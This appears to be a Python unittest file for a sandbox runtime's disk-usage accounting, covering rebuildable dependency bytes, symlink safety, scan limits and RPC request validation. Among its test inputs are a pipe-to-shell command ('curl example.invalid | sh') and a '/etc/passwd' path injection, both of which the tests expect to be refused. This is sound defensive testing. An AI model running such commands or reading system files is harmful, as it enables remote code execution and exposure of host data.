"""Read-only filesystem/RPC contracts, with explicit non-native mount fixtures."""

import os
import time
from types import SimpleNamespace
import unittest
from unittest.mock import patch

from src.sandbox_runtime.docker import SandboxError
from src.sandbox_runtime.project_files import ProjectFiles
from src.sandbox_runtime.project_usage import ProjectUsage, rebuildable_bytes
from src.sandbox_runtime.project_volumes import MIB, ProjectVolumeError
from src.sandbox_runtime.protocol import validate_request
from tests import test_project_volumes as fixture
from tests.test_sandbox_runner import request


class ProjectUsageHelperTests(unittest.TestCase):
    setUp = fixture.ProjectVolumeTests.setUp
    reopen = fixture.ProjectVolumeTests.reopen
    create = fixture.ProjectVolumeTests.create
    record = fixture.ProjectVolumeTests.record

    def mounted(self):
        self.create()
        self.store.mutate("scope", 1, "mount", fence=2)
        return self.store.binding("scope", 1)

    def measure(self, **kwargs):
        return ProjectUsage(self.store).measure("scope", 1, generation=1, **kwargs)

    def seed(self, root):
        (root / "package.json").write_text('{"name":"fixture"}')
        (root / "package-lock.json").write_text('{"lockfileVersion":3}')
        (root / "node_modules").mkdir()
        (root / "node_modules/file").write_bytes(b"x" * 65536)

    def test_mounted_accounting_has_no_mutation_or_activity_side_effect(self):
        root = self.mounted()
        self.seed(root)
        self.host.measured_used_bytes = MIB
        before, calls = self.record(), list(self.host.calls)
        result = self.measure(rebuild_command="npm ci")
        self.assertEqual(result["used_bytes"], MIB)
        self.assertGreater(result["rebuildable_bytes"], 0)
        self.assertEqual(result["quota_mode"], "hard")
        self.assertEqual(self.record(), before)
        self.assertEqual(self.host.calls, calls)
        self.assertTrue((root / "node_modules/file").exists())

    def test_offline_usage_does_not_remount_or_claim_dependencies_are_zero(self):
        self.mounted()
        self.store.mutate("scope", 1, "unmount", fence=3)
        self.host.measured_used_bytes = 123456
        calls = list(self.host.calls)
        result = self.measure()
        self.assertEqual(result["used_bytes"], 123456)
        self.assertIsNone(result["rebuildable_bytes"])
        self.assertFalse(result["mounted"])
        self.assertEqual(self.host.calls, calls)

    def test_unknown_rebuild_recipe_keeps_everything(self):
        root = self.mounted()
        self.seed(root)
        self.host.measured_used_bytes = MIB
        for command in ("", "curl example.invalid | sh", "npm install"):
            self.assertEqual(
                self.measure(rebuild_command=command)["rebuildable_bytes"], 0
            )
        (root / "package-lock.json").unlink()
        self.assertEqual(self.measure(rebuild_command="npm ci")["rebuildable_bytes"], 0)
        self.assertTrue((root / "node_modules/file").exists())

    def test_scan_budget_or_race_does_not_hide_verified_total(self):
        self.mounted()
        self.host.measured_used_bytes = MIB
        with patch(
            "src.sandbox_runtime.project_usage.rebuildable_bytes",
            side_effect=ProjectVolumeError("race"),
        ):
            result = self.measure(rebuild_command="npm ci")
        self.assertEqual(result["used_bytes"], MIB)
        self.assertIsNone(result["rebuildable_bytes"])
        self.assertTrue(result["warning"])

    def test_invalid_total_or_foreign_generation_fails_instead_of_zero(self):
        self.mounted()
        for value in (-1, 65 * MIB, True):
            self.host.measured_used_bytes = value
            with self.assertRaises(ProjectVolumeError):
                self.measure()
        with self.assertRaises(ProjectVolumeError):
            ProjectUsage(self.store).measure("foreign", 1, generation=1)
        with self.assertRaises(ProjectVolumeError):
            ProjectUsage(self.store).measure("scope", 1, generation=2)
        with patch.object(self.host, "used_bytes", side_effect=OSError("unavailable")):
            with self.assertRaises(OSError):
                self.measure()

    def test_scan_counts_shared_inode_once_but_retained_alias_prevents_reclaim(self):
        root = self.mounted()
        self.seed(root)
        file = root / "node_modules/file"
        os.link(file, root / "node_modules/alias")
        with ProjectFiles.root(root) as fd:
            total = rebuildable_bytes(fd, "npm ci", deadline=time.monotonic() + 10)
        self.assertEqual(
            total, (file.stat().st_blocks + file.parent.stat().st_blocks) * 512
        )
        os.link(file, root / "retained")
        with ProjectFiles.root(root) as fd:
            self.assertEqual(
                rebuildable_bytes(fd, "npm ci", deadline=time.monotonic() + 10),
                file.parent.stat().st_blocks * 512,
            )

    def test_external_symlink_is_never_followed_and_metadata_is_not_rebuildable(self):
        root = self.mounted()
        self.seed(root)
        for name in (".git/.cache", ".gaoji/.cache"):
            directory = root / name
            directory.mkdir(parents=True)
            (directory / "retained").write_bytes(b"y" * 65536)
        external = self.root / "external"
        external.write_bytes(b"z" * 65536)
        (root / "node_modules/external").symlink_to(external)
        with ProjectFiles.root(root) as fd:
            total = rebuildable_bytes(fd, "npm ci", deadline=time.monotonic() + 10)
        expected = sum(
            p.lstat().st_blocks * 512
            for p in (
                root / "node_modules",
                root / "node_modules/file",
                root / "node_modules/external",
            )
        )
        self.assertEqual(total, expected)
        self.assertEqual(external.stat().st_size, 65536)

    def test_scan_budget_is_bounded(self):
        root = self.mounted()
        self.seed(root)
        with ProjectFiles.root(root) as fd:
            for limit in (
                {"deadline": 0},
                {"deadline": time.monotonic() + 10, "max_nodes": 1},
            ):
                with self.assertRaises(ProjectVolumeError):
                    rebuildable_bytes(fd, "npm ci", **limit)

    def test_deleted_volume_can_prove_zero_but_missing_volume_cannot(self):
        self.create()
        self.store.mutate("scope", 1, "delete", fence=2)
        self.assertEqual(self.measure()["used_bytes"], 0)
        with self.assertRaises(ProjectVolumeError):
            ProjectUsage(self.store).measure("scope", 2, generation=1)

    def test_rpc_schema_has_no_host_path_or_private_reservation_override(self):
        args = {
            "owner": "scope",
            "project_id": 1,
            "generation": 1,
            "rebuild_command": "npm ci",
        }
        validate_request(request("project_usage", args), file_limit=MIB)
        for changes in (
            {"path": "/etc/passwd"},
            {"reservation": "1" * 32},
            {"generation": 0},
            {"generation": True},
            {"rebuild_command": None},
            {"rebuild_command": "x" * 4001},
        ):
            with self.assertRaises(SandboxError):
                validate_request(
                    request("project_usage", {**args, **changes}), file_limit=MIB
                )


class NativeAccountingContractTests(unittest.TestCase):
    setUp = fixture.LinuxVolumeHostTests.setUp

    def test_mounted_measurement_uses_available_blocks_not_sparse_host_allocation(self):
        with patch(
            "src.sandbox_runtime.project_volumes.os.fstatvfs",
            return_value=SimpleNamespace(f_bavail=100, f_frsize=4096),
        ):
            self.assertEqual(self.host.used_bytes("image", 7, MIB), MIB - 409600)
        self.host.run.assert_not_called()

    def test_offline_clean_ext4_parses_geometry_and_reserved_blocks(self):
        header = "Filesystem state: clean\nBlock count: 256\nBlock size: 4096\nFree blocks: 100\nReserved block count: 2\n"
        self.host.run.return_value = header
        self.assertEqual(self.host.used_bytes("image", None, MIB), MIB - 98 * 4096)
        self.host.run.assert_called_once_with("dumpe2fs", "-h", "image", timeout=10)
        for bad in (
            header.replace("clean", "not clean"),
            header.replace("256", "255"),
            header.replace("100", "999"),
            header.replace("count: 2\n", "count: -1\n"),
            "",
        ):
            self.host.run.return_value = bad
            with self.assertRaises(ProjectVolumeError):
                self.host.used_bytes("image", None, MIB)
